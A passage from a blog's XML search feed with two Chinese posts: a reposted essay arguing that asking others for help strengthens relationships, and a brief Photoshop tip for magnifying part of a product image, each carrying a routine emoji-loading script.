        <content type="html"><![CDATA[<p><strong>- 我至今还记得09.02日的那篇推文！</strong><br><strong>那是一篇微信公众号推文</strong></p><ul><li><p>推文标题：  </p><p>“没关系，我愿意被你麻烦”</p></li><li><p>内容：  </p><p>懂得麻烦别人，才是最高级别的情商。</p></li></ul><p>这个世界上，没有一个人是一座孤岛，也没有一个人能真正的与世隔绝，既然要相互依存，那就要懂得“麻烦别人”。</p><p>本杰明·富兰克林说：“如果你想交一个朋友，那就请他帮你一个忙。”</p><p>很多人都不愿意拉下面子去麻烦别人，总觉得麻烦别人是一件很不好的事情。</p><p><strong>其实，越懂得麻烦别人，越受人欢迎。</strong></p><h2 id="01-好的关系，都是麻烦出来的"><a href="#01-好的关系，都是麻烦出来的" class="headerlink" title="01. 好的关系，都是麻烦出来的"></a>01. 好的关系，都是麻烦出来的</h2><p>武志红在《巨婴国》中说：</p><p>“很多人怕麻烦别人，但是，不麻烦彼此，关系也就无从建立。”</p><p>曾看过一则公益广告：</p><p>年迈的父亲为了不让出门在外的女儿担心，在电话中称自己过得很好，和朋友们一起排节目，一天忙到晚，却向孩子隐瞒了老伴生病住院，自己独自照顾的事实。</p><p>前阵子，朋友的父亲动了手术，一家人也没敢把这事告诉他，还是舅母在电话里向他透了风声，朋友立马请假赶回家了。</p><p>手术完成得很顺利，之后的几天父亲卧床休息，朋友守在床边斟茶倒水，悉心护理。<strong>父亲却总是连番催促他回去，怕耽误了他的工作。</strong></p><p>就连最亲密的家人也是这样，哪怕他们过得再不如意，也舍不得给子女们增添麻烦，这大概就是标准的中国式父母吧。</p><p>其实，父母可以适度地学会示弱，把一部分的忧虑和难处分给儿女。</p><p><strong>儿女在为父母解决问题的过程中，也有一种被需要的感觉，而不是“被麻烦”。</strong></p><p>倪萍曾出演董卿的节目《朗读者》，董卿助阵倪萍的节目《声临其境》，两期节目因为她们的互相麻烦而增色不少。</p><p><strong>互相麻烦的两个人，关系不会因此疏远，反而变得更加亲密。</strong></p><p>好的关系，一定是相互麻烦的，一方付出，一方感恩，这样才能长久。</p><p><strong>互相麻烦，大家彼此温暖，相互帮助，这样才能使关系更加亲密。</strong></p><p>与家人的关系如此，与朋友的关系也如此。</p><h2 id="02-麻烦，需要尺度和界限"><a href="#02-麻烦，需要尺度和界限" class="headerlink" title="02. 麻烦，需要尺度和界限"></a>02. 麻烦，需要尺度和界限</h2><p>胡适就曾经告诫自己儿子：</p><p><strong>“人和人之间，一定要谨守分寸，不冒犯、不打扰，这样才能不惹麻烦。”</strong></p><p>胡适住在研究院宿舍的时候，妻子违反规定打麻将，他屡劝不止，只好带着妻子搬了出去。</p><p>很多人说，院长是你学生，打个麻将也不是什么大事儿，你至于跟他客气吗。</p><p>胡适说，正因为他是我学生，我才不能麻烦他。</p><p>六神磊磊曾经说过：“淘宝能买的土特产，就别问朋友要了。”</p><p><strong>同理，能麻烦自己的事情不要麻烦别人，能麻烦自己家人的事情不要麻烦外人。</strong></p><p>大家都很忙，杀鸡用牛刀，点火用大炮，属于没事儿找事儿。</p><h2 id="03-越懂得麻烦别人，越受欢迎"><a href="#03-越懂得麻烦别人，越受欢迎" class="headerlink" title="03.越懂得麻烦别人，越受欢迎"></a>03.越懂得麻烦别人，越受欢迎</h2><p>卡耐基在《人性的弱点》中曾说：</p><p><strong>“如果想要让交情变得长久，那么你得让别人适当为你做一点小事，这会让别人有存在感和重要感。”</strong></p><p>心理学上有一句话是：<strong>怕麻烦别人，是内心渴望依恋的表现。</strong></p><p>几年前，一部文艺暖心的电影《桃姐》，整整火了一年。</p><p>剧中，仆人桃姐在罗杰家伺候60多年，与主人公罗杰之间的感情早已超越主仆情，变成了一种亲情。</p><p>而让人印象深刻的是，桃姐生病中风后，主动要求住养老院。<strong>她拒绝别人的搀扶、拒绝罗杰家的礼物，不想麻烦罗杰照顾她。</strong></p><p>害怕麻烦别人的人交际圈通常都很小，人也很宅，某种程度也是对自己的一种保护。</p><p><strong>大部分真心想要和你来往的人，都是不自觉地发自内心做出帮助你的行为。</strong>至少在那一刻，他们并不在意你能给他们什么。</p><p>一个适当麻烦别人的人不是索取和贪婪，而是敢于示弱，告诉别人，你需要帮助。</p><p><strong>示弱不代表无能，而是勇敢地深入一段关系。</strong>因此，越懂得麻烦别人的人，越受欢迎。</p><p>麻烦别人，不是故意偷懒，总有一些问题我们无力独自处理，总有一些事情我们需要与人合作；</p><p>麻烦别人，不是为了自己轻松，而是在自己不擅长的领域寻求帮助；</p><p>麻烦别人，不是投机取巧，而是适当地示弱，适当地敞开心扉，我们才能在解决问题的同时拉近与人的关系，建立自信。</p><p>孤军作战的时代已经过去，懂得麻烦别人，我们才能走的更远；</p><p>懂得麻烦别人，才是最高级别的情商。</p><p>以上内容摘抄至某家具销售服务有限公司！  </p><p>推文虽然不是太长，但是受益匪浅！<br>我不会烦你麻烦me，我希望你麻烦me</p><p>我虽然不喜欢麻烦 做事喜欢简约！<br>但是我喜欢别人麻烦me！</p><p>没关系，我愿意被你麻烦！</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 生活随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 生活随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ps快速放大局部细节</title>
      <link href="/posts/42359.html"/>
      <url>/posts/42359.html</url>
      
        <content type="html"><![CDATA[<p>首先用直线工具画一条直线；<br>复制一个图层画一个椭圆，<br>按住alt键复制一个圆到另一端；<br>将商品图层复制一层放置最顶端，<br>创建剪贴蒙板；这个时候ctrl t 选中商品<br>放大我们想要的部分即可！</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 平面设计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 平面设计 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
